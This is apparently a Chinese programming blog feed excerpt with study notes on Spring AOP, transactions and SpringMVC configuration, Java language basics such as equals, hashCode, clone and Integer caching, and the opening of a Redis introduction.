12@Component("guitarOne")public class Guitar implements Intrument&#123;&#125; 23. AOPAOP的核心是切面，它将多个类的通用行为封装成可重用的模块，该模块含有一组API提供横切功能。比如，一个日志模块可以被称作日志的AOP切面。根据需求的不同，一个应用程序可以有若干切面。在SpringAOP中，切面通过带有@Aspect注解的类实现。 关注点是应用中的一个模块的行为，一个关注点可能会被定义成一个我们想实现的一个功能。 横切关注点是一个关注点，此关注点是整个应用都会使用的功能，并影响整个应用，比如日志，安全和数据传输，几乎应用的每个模块都需要的功能。因此这些都属于横切关注点。 连接点代表一个应用程序的某个位置，在这个位置我们可以插入一个AOP切面，它实际上是个应用程序执行Spring AOP的位置。 切点是一个或一组连接点，通知将在这些位置执行。可以通过表达式或匹配的方式指明切入点。 24. AOP通知通知是个在方法执行前后要做的动作，实际上是程序执行时要通过SpringAOP框架触发的代码 Spring切面可以应用五种类型的通知： before：前置通知，在一个方法执行前被调用。@Before after: 在方法执行之后调用的通知，无论方法执行是否成功。@After after-returning: 仅当方法成功完成后执行的通知。@AfterReturning after-throwing: 在方法抛出异常退出时执行的通知。@AfterThrowing around: 在方法执行之前和之后调用的通知。@Around 25. Spring的事务类型编程式事务管理：这意味你通过编程的方式管理事务，给你带来极大的灵活性，但是难维护。 声明式事务管理：这意味着你可以将业务代码和事务管理分离，你只需用注解和XML配置来管理事务。 26. ACID Atomic原子性：事务是由一个或多个活动所组成的一个工作单元。原子性确保事务中的所有操作全部发生或者全部不发生。 Consistent一致性：一旦事务完成，系统必须确保它所建模的业务处于一致的状态 Isolated隔离性：事务允许多个用户对象头的数据进行操作，每个用户的操作不会与其他用户纠缠在一起。 Durable持久性：一旦事务完成，事务的结果应该持久化，这样就能从任何的系统崩溃中恢复过来。 27. JDBC事务如果在应用程序中直接使用JDBC来进行持久化，譬如博主采用的是Mybatis，DataSourceTransactionManager会为你处理事务边界。譬如： 1234567891011&lt;bean id=&quot;dataSource&quot; class=&quot;org.apache.commons.dbcp.BasicDataSource&quot; destroy-method=&quot;close&quot;&gt; &lt;property name=&quot;driverClassName&quot; value=&quot;$&#123;driver&#125;&quot; /&gt; &lt;property name=&quot;url&quot; value=&quot;$&#123;url&#125;&quot; /&gt; &lt;property name=&quot;username&quot; value=&quot;zzh&quot; /&gt; &lt;property name=&quot;password&quot; value=&quot;zzh&quot; /&gt; &lt;property name=&quot;validationQuery&quot; value=&quot;SELECT 1&quot;/&gt;&lt;/bean&gt;&lt;bean id=&quot;transactionManager&quot; class=&quot;org.springframework.jdbc.datasource.DataSourceTransactionManager&quot;&gt; &lt;property name=&quot;dataSource&quot; ref=&quot;dataSource&quot;/&gt;&lt;/bean&gt; 28. JTA事务如果你的事务需要跨多个事务资源（例如：两个或多个数据库；或者如Sping+ActiveMQ整合需要将ActiveMQ和数据库的事务整合起来），就需要使用JtaTransactionManager: 1&lt;bean id="jtaTransactionManager"class="org.springframework.transaction.jta.JtaTransactionManager"/&gt; JtaTransactionManager将事务管理的职责委托给了一个JTA的实现。JTA规定了应用程序与一个或多个数据源之间协调事务的标准API。transactionManagerName属性指明了要在JNDI上查找的JTA事务管理器。 JtaTransactionManager将事务管理的职责委托给javax.transaction.UserTransaction和javax.transaction.TransactionManager对象。通过UserTransaction.commit()方法来提交事务。类似地，如果事务失败，UserTransaction的rollback()方法将会被调用。 29. 声明式事务尽管Spring提供了多种声明式事务的机制，但是所有的方式都依赖这五个参数来控制如何管理事务策略。因此，如果要在Spring中声明事务策略，就要理解这些参数。(@Transactional) 隔离级别(isolation) ISOLATION_DEFAULT: 使用底层数据库预设的隔离层级 ISOLATION_READ_COMMITTED: 允许事务读取其他并行的事务已经送出（Commit）的数据字段，可以防止Dirty read问题 ISOLATION_READ_UNCOMMITTED: 允许事务读取其他并行的事务还没送出的数据，会发生Dirty、Nonrepeatable、Phantom read等问题 ISOLATION_REPEATABLE_READ: 要求多次读取的数据必须相同，除非事务本身更新数据，可防止Dirty、Nonrepeatable read问题 ISOLATION_SERIALIZABLE: 完整的隔离层级，可防止Dirty、Nonrepeatable、Phantom read等问题，会锁定对应的数据表格，因而有效率问题 传播行为(propagation) PROPAGATION_REQUIRED–支持当前事务，如果当前没有事务，就新建一个事务。这是最常见的选择。 PROPAGATION_SUPPORTS–支持当前事务，如果当前没有事务，就以非事务方式执行。 PROPAGATION_MANDATORY–支持当前事务，如果当前没有事务，就抛出异常。 PROPAGATION_REQUIRES_NEW–新建事务，如果当前存在事务，把当前事务挂起。 PROPAGATION_NOT_SUPPORTED–以非事务方式执行操作，如果当前存在事务，就把当前事务挂起。 PROPAGATION_NEVER–以非事务方式执行，如果当前存在事务，则抛出异常。 PROPAGATION_NESTED–如果当前存在事务，则在嵌套事务内执行。如果当前没有事务，则进行与PROPAGATION_REQUIRED类似的操作。 只读(read-only) 如果事务只进行读取的动作，则可以利用底层数据库在只读操作时发生的一些最佳化动作，由于这个动作利用到数据库在只读的事务操作最佳化，因而必须在事务中才有效，也就是说要搭配传播行为PROPAGATION_REQUIRED、PROPAGATION_REQUIRES_NEW、PROPAGATION_NESTED来设置。 事务超时(timeout) 有的事务操作可能延续很长一段的时间，事务本身可能关联到数据表的锁定，因而长时间的事务操作会有效率上的问题，对于过长的事务操作，考虑Roll back事务并要求重新操作，而不是无限时的等待事务完成。 可以设置事务超时期间，计时是从事务开始时，所以这个设置必须搭配传播行为PROPAGATION_REQUIRED、PROPAGATION_REQUIRES_NEW、PROPAGATION_NESTED来设置。 回滚规则(rollback-for, no-rollback-for)：rollback-for指事务对于那些检查型异常应当回滚而不提交；no-rollback-for指事务对于那些异常应当继续运行而不回滚。默认情况下，Spring声明事务对所有的运行时异常都进行回滚。 12345&lt;tx:advice id=&quot;txAdvice&quot; transaction-manager=&quot;transactionManager&quot;&gt; &lt;tx:attributes&gt; &lt;tx:method name=&quot;*&quot; /&gt; &lt;/tx:attributes&gt;&lt;/tx:advice&gt; 30. SpringMVC 核心架构的具体流程： 首先用户发送请求——&gt;DispatcherServlet，前端控制器收到请求后自己不进行处理，而是委托给其他的解析器进行处理，作为统一访问点，进行全局的流程控制； DispatcherServlet——&gt;HandlerMapping， HandlerMapping将会把请求映射为HandlerExecutionChain对象（包含一个Handler处理器（页面控制器）对象、多个HandlerInterceptor拦截器）对象，通过这种策略模式，很容易添加新的映射策略； DispatcherServlet——&gt;HandlerAdapter，HandlerAdapter将会把处理器包装为适配器，从而支持多种类型的处理器，即适配器设计模式的应用，从而很容易支持很多类型的处理器； HandlerAdapter——&gt;处理器功能处理方法的调用，HandlerAdapter将会根据适配的结果调用真正的处理器的功能处理方法，完成功能处理；并返回一个ModelAndView对象（包含模型数据、逻辑视图名）； ModelAndView的逻辑视图名——&gt; ViewResolver， ViewResolver将把逻辑视图名解析为具体的View，通过这种策略模式，很容易更换其他视图技术； View——&gt;渲染，View会根据传进来的Model模型数据进行渲染，此处的Model实际是一个Map数据结构，因此很容易支持其他视图技术； 返回控制权给DispatcherServlet，由DispatcherServlet返回响应给用户，到此一个流程结束。 31. DispatcherServletSpringMVC的核心是DispatcherServlet，这个Servlet充当SpringMVC的前端控制器。与其他Servlet一样，DispatcherServlet必须在Web应用程序的web.xml文件中进行配置。 12345&lt;servlet&gt; &lt;servlet-name&gt;viewspace&lt;/servlet-name&gt; &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt; &lt;load-on-startup&gt;2&lt;/load-on-startup&gt;&lt;/servlet&gt; 默认情况下，DispatcherServlet在加载时会从一个基于这个Servlet名字的XML文件中加载Spring应用上下文。因为servlet的名字是viewspace，所以配置文件的名称为viewspace-servlet.xml。接下来，必须申明DispatcherServlet处理哪些URL： 1234&lt;servlet-mapping&gt; &lt;servlet-name&gt;viewspace&lt;/servlet-name&gt; &lt;url-pattern&gt;/&lt;/url-pattern&gt;&lt;/servlet-mapping&gt; 通过将DispatcherServlet映射到/，声明了它会作为默认的servlet并且会处理所有的请求，包括对静态资源的请求。可以配置： 123456&lt;mvc:resources mapping="/images/**" location="/images/" cache-period="31556926" /&gt;&lt;mvc:resources mapping="/js/**" location="/js/" cache-period="31556926" /&gt;&lt;mvc:resources mapping="/css/**" location="/css/" cache-period="31556926" /&gt; 处理静态资源。 32. 配置HandlerMappingSpring自带了多个处理器映射实现： BeanNameUrlHandlerMapping：根据控制器Bean的名字将控制器映射到URL。 ControllerBeanNameHandlerMapping：与BeanNameUrlHandlerMapping类似，根据控制器Bean的名字将控制器映射到URL。使用该处理器映射实现，Bean的名字不需要遵循URL的约定。 ControllerClassNameHandlerMapping：通过使用控制器的类名作为URL基础将控制器映射到URL。 DefaultAnnotationHandlerMapping：将请求映射给使用@RequestingMapping注解的控制器和控制器方法。 SimpleUrlHandlerMapping：使用定义在Spring应用上下文的熟悉集合将控制器映射到URL。 使用如上这些处理器映射通常只需在Spring中配置一个Bean。如果没有找到处理器映射Bean,DisapatchServlet将创建并使用BeanNameUrlHandlerMapping和DefaultAnnotationHandlerMapping。我们一般使用基于注解的控制器类。 1234&lt;mvc:annotation-driven /&gt;&lt;bean id="defaultAnnotationHandlerMapping" class="org.springframework.web.servlet.mvc.annotation.AnnotationMethodHandlerAdapter"&gt;&lt;/bean&gt; 在构建控制器的时候，我们还需要使用注解将请求参数绑定到控制器的方法参数上进行校验以及信息转换。提供注解驱动的特性。 33. 配置HandlerAdapter12&lt;bean id="annotationMethodHandlerAdapter"class="org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping" /&gt; 34. 配置视图在SpringMVC中大量使用了约定优于配置的开发模式。InternalResourceViewResolver就是一个面向约定的元素。它将逻辑视图名称解析为View对象，而该对象将渲染的任务委托给Web应用程序上下文中的一个模板。 12345678&lt;!-- 配置视图解析器，将ModelAndView及字符串解析为具体的页面 --&gt;&lt;bean class="org.springframework.web.servlet.view.InternalResourceViewResolver"&gt; &lt;property name="viewClass" value="org.springframework.web.servlet.view.JstlView" /&gt; &lt;property name="prefix" value="/WEB-INF/jsp/" /&gt; &lt;property name="suffix" value=".jsp" /&gt;&lt;/bean&gt; 当DispatcherServlet要求InternalResourceViewResolver解析视图的时候，它将获取一个逻辑视图名称，添加/WEB-INF/jsp/前缀和.jsp后缀。等待的结果就是渲染输出的JSP路径。在内部，InternalResourceViewResolver接下来会将这个路径传递给View对象，View对象将请求传递给JSP. 转自：https://blog.csdn.net/u013256816/article/details/51386182]]></content>
      <tags>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[1.Java基础]]></title>
    <url>%2F2018%2F07%2F21%2F1.Java%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[从今天开始，java基础开始重新整理，这是第一篇，是比较基础的知识。 一、关键字final1. 数据 声明数据为常量，可以是编译时常量，也可以是在运行时被初始化后不能被改变的常量。 对于基本类型，final 使数值不变； 对于引用类型，final 使引用不变，也就不能引用其它对象，但是被引用的对象本身是可以修改的。 1234final int x = 1;// x = 2; // cannot assign value to final variable 'x'final A y = new A();y.a = 1; 2. 方法 声明方法不能被子类覆盖。 private 方法隐式地被指定为 final，如果在子类中定义的方法和基类中的一个 private 方法签名相同，此时子类的方法不是覆盖基类方法，而是在子类中定义了一个新的方法。 3. 类 声明类不允许被继承。 static1. 静态变量 静态变量在内存中只存在一份，只在类初始化时赋值一次。 静态变量：类所有的实例都共享静态变量，可以直接通过类名来访问它； 实例变量：每创建一个实例就会产生一个实例变量，它与该实例同生共死。 1234public class A &#123; private int x; // 实例变量 public static int y; // 静态变量&#125; 2. 静态方法 静态方法在类加载的时候就存在了，它不依赖于任何实例，所以静态方法必须有实现，也就是说它不能是抽象方法（abstract）。 3. 静态语句块 静态语句块在类初始化时运行一次。 4. 静态内部类 内部类的一种，静态内部类不依赖外部类，且不能访问外部类的非静态的变量和方法。 5. 静态导包 1import static com.xxx.ClassName.* 在使用静态变量和方法时不用再指明 ClassName，从而简化代码，但可读性大大降低。 6. 变量赋值顺序 静态变量的赋值和静态语句块的运行优先于实例变量的赋值和普通语句块的运行，静态变量的赋值和静态语句块的运行哪个先执行取决于它们在代码中的顺序。 存在继承的情况下，初始化顺序为： 父类（静态变量、静态语句块） 子类（静态变量、静态语句块） 父类（实例变量、普通语句块） 父类（构造函数） 子类（实例变量、普通语句块） 子类（构造函数） 二、Object 通用方法概览1234567891011public final native Class&lt;?&gt; getClass()public native int hashCode()public boolean equals(Object obj)protected native Object clone() throws CloneNotSupportedExceptionpublic String toString()public final native void notify()public final native void notifyAll()public final native void wait(long timeout) throws InterruptedExceptionpublic final void wait(long timeout, int nanos) throws InterruptedExceptionpublic final void wait() throws InterruptedExceptionprotected void finalize() throws Throwable &#123;&#125; equals()1. equals() 与 == 的区别 对于基本类型，== 判断两个值是否相等，基本类型没有 equals() 方法。 对于引用类型，== 判断两个实例是否引用同一个对象，而 equals() 判断引用的对象是否等价。 1234Integer x = new Integer(1);Integer y = new Integer(1);System.out.println(x.equals(y)); // trueSystem.out.println(x == y); // false 默认情况下也就是从超类Object继承而来的equals方法与‘==’是完全等价的，比较的都是对象的内存地址，但我们可以重写equals方法，使其按照我们的需求的方式进行比较，如String类重写了equals方法，使其比较的是字符的序列，而不再是内存地址。 2. 等价关系 （一）自反性 1x.equals(x); // true （二）对称性 1x.equals(y) == y.equals(x); // true （三）传递性 12if (x.equals(y) &amp;&amp; y.equals(z)) x.equals(z); // true; （四）一致性 多次调用 equals() 方法结果不变 1x.equals(y) == x.equals(y); // true （五）与 null 的比较 对任何不是 null 的对象 x 调用 x.equals(null) 结果都为 false 1x.euqals(null); // false; 3. 实现 检查是否为同一个对象的引用，如果是直接返回 true； 检查是否是同一个类型，如果不是，直接返回 false； 将 Object 实例进行转型； 判断每个关键域是否相等。 1234567891011121314151617181920212223public class EqualExample &#123; private int x; private int y; private int z; public EqualExample(int x, int y, int z) &#123; this.x = x; this.y = y; this.z = z; &#125; @Override public boolean equals(Object o) &#123; if (this == o) return true; if (o == null || getClass() != o.getClass()) return false; EqualExample that = (EqualExample) o; if (x != that.x) return false; if (y != that.y) return false; return z == that.z; &#125;&#125; hashCode()hasCode() 返回散列值，而 equals() 是用来判断两个实例是否等价。等价的两个实例散列值一定要相同，但是散列值相同的两个实例不一定等价。 在覆盖 equals() 方法时应当总是覆盖 hashCode() 方法，保证等价的两个实例散列值也相等。 下面的代码中，新建了两个等价的实例，并将它们添加到 HashSet 中。我们希望将这两个实例当成一样的，只在集合中添加一个实例，但是因为 EqualExample 没有实现 hasCode() 方法，因此这两个实例的散列值是不同的，最终导致集合添加了两个等价的实例。 1234567EqualExample e1 = new EqualExample(1, 1, 1);EqualExample e2 = new EqualExample(1, 1, 1);System.out.println(e1.equals(e2)); // trueHashSet&lt;EqualExample&gt; set = new HashSet&lt;&gt;();set.add(e1);set.add(e2);System.out.println(set.size()); // 2 理想的散列函数应当具有均匀性，即不相等的实例应当均匀分布到所有可能的散列值上。这就要求了散列函数要把所有域的值都考虑进来，可以将每个域都当成 R 进制的某一位，然后组成一个 R 进制的整数。R 一般取 31，因为它是一个奇素数，如果是偶数的话，当出现乘法溢出，信息就会丢失，因为与 2 相乘相当于向左移一位。 之所以选择31，是因为它是个奇素数，如果乘数是偶数，并且乘法溢出的话，信息就会丢失，因为与2相乘等价于移位运算。使用素数的好处并不是很明显，但是习惯上都使用素数来计算散列结果。31有个很好的特性，就是用移位和减法来代替乘法，可以得到更好的性能：31*i==(i&lt;&lt;5)-i。现在的VM可以自动完成这种优化。 12345678@Overridepublic int hashCode() &#123; int result = 17; result = 31 * result + x; result = 31 * result + y; result = 31 * result + z; return result;&#125; clone()1. cloneable clone() 是 Object 的受保护方法，这意味着，如果一个类不显式去覆盖 clone() 就没有这个方法。 1234public class CloneExample &#123; private int a; private int b;&#125; 12CloneExample e1 = new CloneExample();// CloneExample e2 = e1.clone(); // 'clone()' has protected access in 'java.lang.Object' 接下来覆盖 Object 的 clone() 得到以下实现： 123456789public class CloneExample &#123; private int a; private int b; @Override protected CloneExample clone() throws CloneNotSupportedException &#123; return (CloneExample)super.clone(); &#125;&#125; 123456CloneExample e1 = new CloneExample();try &#123; CloneExample e2 = e1.clone();&#125; catch (CloneNotSupportedException e) &#123; e.printStackTrace();&#125; 1java.lang.CloneNotSupportedException: CloneTest 以上抛出了 CloneNotSupportedException，这是因为 CloneTest 没有实现 Cloneable 接口。 123456789public class CloneExample implements Cloneable &#123; private int a; private int b; @Override protected Object clone() throws CloneNotSupportedException &#123; return super.clone(); &#125;&#125; 应该注意的是，clone() 方法并不是 Cloneable 接口的方法，而是 Object 的一个 protected 方法。Cloneable 接口只是规定，如果一个类没有实现 Cloneable 接口又调用了 clone() 方法，就会抛出 CloneNotSupportedException。 2. 深拷贝与浅拷贝 浅拷贝：拷贝实例和原始实例的引用类型引用同一个对象； 深拷贝：拷贝实例和原始实例的引用类型引用不同对象。 1234567891011121314151617181920212223public class ShallowCloneExample implements Cloneable &#123; private int[] arr; public ShallowCloneExample() &#123; arr = new int[10]; for (int i = 0; i &lt; arr.length; i++) &#123; arr[i] = i; &#125; &#125; public void set(int index, int value) &#123; arr[index] = value; &#125; public int get(int index) &#123; return arr[index]; &#125; @Override protected ShallowCloneExample clone() throws CloneNotSupportedException &#123; return (ShallowCloneExample) super.clone(); &#125;&#125; 123456789ShallowCloneExample e1 = new ShallowCloneExample();ShallowCloneExample e2 = null;try &#123; e2 = e1.clone();&#125; catch (CloneNotSupportedException e) &#123; e.printStackTrace();&#125;e1.set(2, 222);System.out.println(e2.get(2)); // 222 12345678910111213141516171819202122232425262728public class DeepCloneExample implements Cloneable &#123; private int[] arr; public DeepCloneExample() &#123; arr = new int[10]; for (int i = 0; i &lt; arr.length; i++) &#123; arr[i] = i; &#125; &#125; public void set(int index, int value) &#123; arr[index] = value; &#125; public int get(int index) &#123; return arr[index]; &#125; @Override protected DeepCloneExample clone() throws CloneNotSupportedException &#123; DeepCloneExample result = (DeepCloneExample) super.clone(); result.arr = new int[arr.length]; for (int i = 0; i &lt; arr.length; i++) &#123; result.arr[i] = arr[i]; &#125; return result; &#125;&#125; 123456789DeepCloneExample e1 = new DeepCloneExample();DeepCloneExample e2 = null;try &#123; e2 = e1.clone();&#125; catch (CloneNotSupportedException e) &#123; e.printStackTrace();&#125;e1.set(2, 222);System.out.println(e2.get(2)); // 2 使用 clone() 方法来拷贝一个对象即复杂又有风险，它会抛出异常，并且还需要类型转换。Effective Java 书上讲到，最好不要去使用 clone()，可以使用拷贝构造函数或者拷贝工厂来拷贝一个对象。 12345678910111213141516171819202122232425public class CloneConstructorExample &#123; private int[] arr; public CloneConstructorExample() &#123; arr = new int[10]; for (int i = 0; i &lt; arr.length; i++) &#123; arr[i] = i; &#125; &#125; public CloneConstructorExample(CloneConstructorExample original) &#123; arr = new int[original.arr.length]; for (int i = 0; i &lt; original.arr.length; i++) &#123; arr[i] = original.arr[i]; &#125; &#125; public void set(int index, int value) &#123; arr[index] = value; &#125; public int get(int index) &#123; return arr[index]; &#125;&#125; 1234CloneConstructorExample e1 = new CloneConstructorExample();CloneConstructorExample e2 = new CloneConstructorExample(e1);e1.set(2, 222);System.out.println(e2.get(2)); // 2 四、继承访问权限Java 中有三个访问权限修饰符：private、default、protected 以及 public，如果不加访问修饰符，表示包级可见。 可以对类或类中的成员（字段以及方法）加上访问修饰符。 成员可见表示其它类可以用这个类的实例访问到该成员； 类可见表示其它类可以用这个类创建对象。 protected 用于修饰成员，表示在继承体系中成员对于子类可见，但是这个访问修饰符对于类没有意义。 如果子类的方法覆盖了父类的方法，那么子类中该方法的访问级别不允许低于父类的访问级别。这是为了确保可以使用父类实例的地方都可以使用子类实例，也就是确保满足里氏替换原则。 字段决不能是公有的，因为这么做的话就失去了对这个字段修改行为的控制，客户端可以对其随意修改。可以使用公有的 getter 和 setter 方法来替换公有字段。 抽象类与接口1. 抽象类 抽象类和抽象方法都使用 abstract 进行声明。抽象类一般会包含抽象方法，抽象方法一定位于抽象类中。 抽象类和普通类最大的区别是，抽象类不能被实例化，需要继承抽象类才能实例化其子类。 1234567891011public abstract class AbstractClassExample &#123; protected int x; private int y; public abstract void func1(); public void func2() &#123; System.out.println("func2"); &#125;&#125; 123456public class AbstractExtendClassExample extends AbstractClassExample&#123; @Override public void func1() &#123; System.out.println("func1"); &#125;&#125; 123// AbstractClassExample ac1 = new AbstractClassExample(); // 'AbstractClassExample' is abstract; cannot be instantiatedAbstractClassExample ac2 = new AbstractExtendClassExample();ac2.func1(); 2. 接口 接口是抽象类的延伸，在 Java 8 之前，它可以看成是一个完全抽象的类，也就是说它不能有任何的方法实现。 从 Java 8 开始，接口也可以拥有默认的方法实现，这是因为不支持默认方法的接口的维护成本太高了。在 Java 8 之前，如果一个接口想要添加新的方法，那么要修改所有实现了该接口的类。 接口的成员（字段 + 方法）默认都是 public 的，并且不允许定义为 private 或者 protected。 接口的字段默认都是 static 和 final 的。 1234567891011121314public interface InterfaceExample &#123; void func1(); default void func2()&#123; System.out.println("func2"); &#125; int x = 123; // int y; // Variable 'y' might not have been initialized public int z = 0; // Modifier 'public' is redundant for interface fields // private int k = 0; // Modifier 'private' not allowed here // protected int l = 0; // Modifier 'protected' not allowed here // private void fun3(); // Modifier 'private' not allowed here&#125; 123456public class InterfaceImplementExample implements InterfaceExample &#123; @Override public void func1() &#123; System.out.println("func1"); &#125;&#125; 1234// InterfaceExample ie1 = new InterfaceExample(); // 'InterfaceExample' is abstract; cannot be instantiatedInterfaceExample ie2 = new InterfaceImplementExample();ie2.func1();System.out.println(InterfaceExample.x); 3. 比较 从设计层面上看，抽象类提供了一种 IS-A 关系，那么就必须满足里式替换原则，即子类对象必须能够替换掉所有父类对象。而接口更像是一种 LIKE-A 关系，它只是提供一种方法实现契约，并不要求接口和实现接口的类具有 IS-A 关系。 从使用上来看，一个类可以实现多个接口，但是不能继承多个抽象类。 接口的字段只能是 static 和 final 类型的，而抽象类的字段没有这种限制。 接口的方法只能是 public 的，而抽象类的方法可以由多种访问权限。 4. 使用选择 使用抽象类： 需要在几个相关的类中共享代码。 需要能控制继承来的方法和域的访问权限，而不是都为 public。 需要继承非静态（non-static）和非常量（non-final）字段。 使用接口： 需要让不相关的类都实现一个方法，例如不相关的类都可以实现 Compareable 接口中的 compareTo() 方法； 需要使用多重继承。 在很多情况下，接口优先于抽象类，因为接口没有抽象类严格的类层次结构要求，可以灵活地为一个类添加行为。并且从 Java 8 开始，接口也可以有默认的方法实现，使得修改接口的成本也变的很低。 super 访问父类的构造函数：可以使用 super() 函数访问父类的构造函数，从而完成一些初始化的工作。 访问父类的成员：如果子类覆盖了父类的中某个方法的实现，可以通过使用 super 关键字来引用父类的方法实现。 12345678910111213public class SuperExample &#123; protected int x; protected int y; public SuperExample(int x, int y) &#123; this.x = x; this.y = y; &#125; public void func() &#123; System.out.println("SuperExample.func()"); &#125;&#125; 1234567891011121314public class SuperExtendExample extends SuperExample &#123; private int z; public SuperExtendExample(int x, int y, int z) &#123; super(x, y); this.z = z; &#125; @Override public void func() &#123; super.func(); System.out.println("SuperExtendExample.func()"); &#125;&#125; 12SuperExample e = new SuperExtendExample(1, 2, 3);e.func(); 12SuperExample.func()SuperExtendExample.func() 覆盖与重载 覆盖（Override） 存在于继承体系中，指子类实现了一个与父类在方法声明上完全相同的一个方法； 重载（Overload） 存在于同一个类中，指一个方法与已经存在的方法名称上相同，但是参数类型、个数、顺序至少有一个不同。应该注意的是，返回值不同，其它都相同不算是重载。 五、StringString, StringBuffer and StringBuilder1. 是否可变 String 不可变 StringBuffer 和 StringBuilder 可变 2. 是否线程安全 String 不可变，因此是线程安全的 StringBuilder 不是线程安全的 StringBuffer 是线程安全的，内部使用 synchronized 来同步 String 不可变的原因1. 可以缓存 hash 值 因为 String 的 hash 值经常被使用，例如 String 用做 HashMap 的 key。不可变的特性可以使得 hash 值也不可变，因此只需要进行一次计算。 2. String Pool 的需要 如果一个 String 对象已经被创建过了，那么就会从 String Pool 中取得引用。只有 String 是不可变的，才可能使用 String Pool。 3. 安全性 String 经常作为参数，String 不可变性可以保证参数不可变。例如在作为网络连接参数的情况下如果 String 是可变的，那么在网络连接过程中，String 被改变，改变 String 对象的那一方以为现在连接的是其它主机，而实际情况却不一定是。 4. 线程安全 String 不可变性天生具备线程安全，可以在多个线程中安全地使用。 String.intern()使用 String.intern() 可以保证相同内容的字符串实例引用相同的内存对象。 下面示例中，s1 和 s2 采用 new String() 的方式新建了两个不同对象，而 s3 是通过 s1.intern() 方法取得一个对象引用，这个方法首先把 s1 引用的对象放到 String Poll（字符串常量池）中，然后返回这个对象引用。因此 s3 和 s1 引用的是同一个字符串常量池的对象。 12345String s1 = new String("aaa");String s2 = new String("aaa");System.out.println(s1 == s2); // falseString s3 = s1.intern();System.out.println(s1.intern() == s3); // true 如果是采用 “bbb” 这种使用双引号的形式创建字符串实例，会自动地将新建的对象放入 String Pool 中。 123String s4 = "bbb";String s5 = "bbb";System.out.println(s4 == s5); // true 在 Java 7 之前，字符串常量池被放在运行时常量池中，它属于永久代。而在 Java 7，字符串常量池被放在堆中。这是因为永久代的空间有限，在大量使用字符串的场景下会导致 OutOfMemoryError 错误。 六、基本类型与运算包装类型八个基本类型： boolean/1 byte/8 char/16 short/16 int/32 float/32 long/64 double/64 基本类型都有对应的包装类型，基本类型与其对应的包装类型之间的赋值使用自动装箱与拆箱完成。 12Integer x = 2; // 装箱int y = x; // 拆箱 new Integer(123) 与 Integer.valueOf(123) 的区别在于，new Integer(123) 每次都会新建一个对象，而 Integer.valueOf(123) 可能会使用缓存对象，因此多次使用 Integer.valueOf(123) 会取得同一个对象的引用。 123456Integer x = new Integer(123);Integer y = new Integer(123);System.out.println(x == y); // falseInteger z = Integer.valueOf(123);Integer k = Integer.valueOf(123);System.out.println(z == k); // true 编译器会在自动装箱过程调用 valueOf() 方法，因此多个 Integer 实例使用自动装箱来创建并且值相同，那么就会引用相同的对象。 123Integer m = 123;Integer n = 123;System.out.println(m == n); // true valueOf() 方法的实现比较简单，就是先判断值是否在缓存池中，如果在的话就直接使用缓存池的内容。 12345public static Integer valueOf(int i) &#123; if (i &gt;= IntegerCache.low &amp;&amp; i &lt;= IntegerCache.high) return IntegerCache.cache[i + (-IntegerCache.low)]; return new Integer(i);&#125; 在 Java 8 中，Integer 缓存池的大小默认为 -128~127。 1234567891011121314151617181920212223242526272829static final int low = -128;static final int high;static final Integer cache[];static &#123; // high value may be configured by property int h = 127; String integerCacheHighPropValue = sun.misc.VM.getSavedProperty("java.lang.Integer.IntegerCache.high"); if (integerCacheHighPropValue != null) &#123; try &#123; int i = parseInt(integerCacheHighPropValue); i = Math.max(i, 127); // Maximum array size is Integer.MAX_VALUE h = Math.min(i, Integer.MAX_VALUE - (-low) -1); &#125; catch( NumberFormatException nfe) &#123; // If the property cannot be parsed into an int, ignore it. &#125; &#125; high = h; cache = new Integer[(high - low) + 1]; int j = low; for(int k = 0; k &lt; cache.length; k++) cache[k] = new Integer(j++); // range [-128, 127] must be interned (JLS7 5.1.7) assert IntegerCache.high &gt;= 127;&#125; Java 还将一些其它基本类型的值放在缓冲池中，包含以下这些： boolean values true and false all byte values short values between -128 and 127 int values between -128 and 127 char in the range \u0000 to \u007F 因此在使用这些基本类型对应的包装类型时，就可以直接使用缓冲池中的对象。 switch从 Java 7 开始，可以在 switch 条件判断语句中使用 String 对象。 123456789String s = "a";switch (s) &#123; case "a": System.out.println("aaa"); break; case "b": System.out.println("bbb"); break;&#125; switch 不支持 long，是因为 swicth 的设计初衷是为那些只需要对少数的几个值进行等值判断，如果值过于复杂，那么还是用 if 比较合适。]]></content>
      <tags>
        <tag>java基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[1.redis简介]]></title>
    <url>%2F2018%2F07%2F21%2F1.redis%E7%AE%80%E4%BB%8B%2F</url>
    <content type="text"><![CDATA[系统学习redis的第一篇，首先来基本感受一下redis是什么，为什么用他？ 1. redis是什么Redis是一个开源的使用ANSI C语言编写、支持网络、单进程单线程、可基于内存亦可持久化的日志型、一个高性能的key-value数据库。 2. Redis与其他key-value存储有什么不同 多样的数据结构和原子性操作 Redis有着更为复杂的数据结构并且提供对他们的原子性操作，这是一个不同于其他数据库的进化路径。Redis的数据类型都是基于基本数据结构的同时对程序员透明，无需进行额外的抽象。 运行于内存+持久化于磁盘 Redis运行在内存中但是可以持久化到磁盘，所以在对不同数据集进行高速读写时需要权衡内存，因为数据量不能大于硬件内存。在内存数据库方面的另一个优点是， 相比在磁盘上相同的复杂的数据结构，在内存中操作起来非常简单，这样Redis可以做很多内部复杂性很强的事情。 同时，在磁盘格式方面他们是紧凑的以追加的方式产生的，因为他们并不需要进行随机访问。 3. redis特点 速度快：基于内存,这是快的最主要原因。 持久化：异步保存到磁盘中 多种数据结构：除了五种基本数据类型，还支持位图、HyperLogLog，GEO等 支持多种编程语言：java，python，ruby，php，Lua，nodejs… 功能丰富：可以实现发布-订阅，支持事务、Lua脚本 简单：不依赖与外部库、单线程模型 主从复制：主服务器同步数据到从服务器，是高可用的基础 高可用、分布式：高可用：redis-Sentinel(v2.8版本)；分布式：redis-cluster(v3.0版本) 4. redis典型应用场景 缓存系统：这个就不多说了，redis作为高速缓存是其主要存在价值。 计数器：因为是原子操作+单线程，作为计数器永远不会出错 消息队列系统：数据结构可以实现这种生产者-消费者模式的消息队列。 排行榜：有序集合sorted set就可以实现 社交网络：redis与社交网络就是一家，非常方便就能实现诸如共同好友这些功能。 实时系统：如垃圾邮件处理系统 5. redis优势 缓存管理：可以在必要时将无效的旧数据从内存中删除，为新数据腾出新的空间 提供更大的灵活性：redis支持多种类型，并且采用key-value 